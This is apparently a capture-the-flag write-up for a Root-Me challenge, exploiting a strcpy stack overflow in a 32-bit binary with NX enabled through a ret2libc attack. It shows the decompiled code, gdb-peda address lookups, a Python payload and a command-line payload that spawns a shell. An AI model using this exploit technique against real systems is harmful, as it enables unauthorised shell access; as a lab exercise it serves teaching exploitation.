### S0lv3d by H4yicl3

First i download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  int v4; // [sp+1Ch] [bp-14h]@3      //overflow this v4

  if ( argc == 2 )
  {
    strcpy((char *)&v4, argv[1]);      //bug here
    printf("Your message: %s\n", &v4);
    result = 0;
  }
  else
  {
    printf("Usage: %s <message>\n", *argv);
    result = -1;
  }
  return result;
}
```
This is normal buffer overflow program !!
but then i use gdb-peda to check
```
gdb -q ch33
Reading symbols from ch33...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
The Flag NX enabled !! That mean we can't write shell code in stack and use shell under environtment variable like before
So what we can do !! Ret2lib -> that is hint of this challenge

Ret2lib mean we pointed return address to the code line (system("/bin/sh")! you know?
if not !! you should google to get more information 

So we use gdb to find the address of system address of /bin/sh ...!! blahblah
```
gdp-peda$ b *main
gdp-peda$ r
gdb-peda$ p &system
$1 = (<text variable, no debug info> *) 0xf7e51310 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f7184c ("/bin/sh")
gdb-peda$ 
```
>we had address system is 0xf7e51310 and /bin/sh is 0xf7f7184c 
try to write a script look like
```python
padding ="A"*32
system="\x10\x13\xe5\xf7"
retn_after="AAAA"
binsh="\x4c\x18\xf7\xf7"
print padding + system + retn_after + binsh
```
why i used system + retn_after + binsh
because when we called system we need input one address let it return after did some stuff !! you know !! 
run it maybe!!
```
./ch33 $(python ch33.py)
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAL?��
$ whoami
hayicle
$ 
```
We controled the shell !! GLHF!!

the script i use in sever
```
./ch33 $(python -c 'print "A"*32 + "\xb0\x90\xe6\xb7"+"AAAA"+"\x40\xac\xf8\xb7"')
```
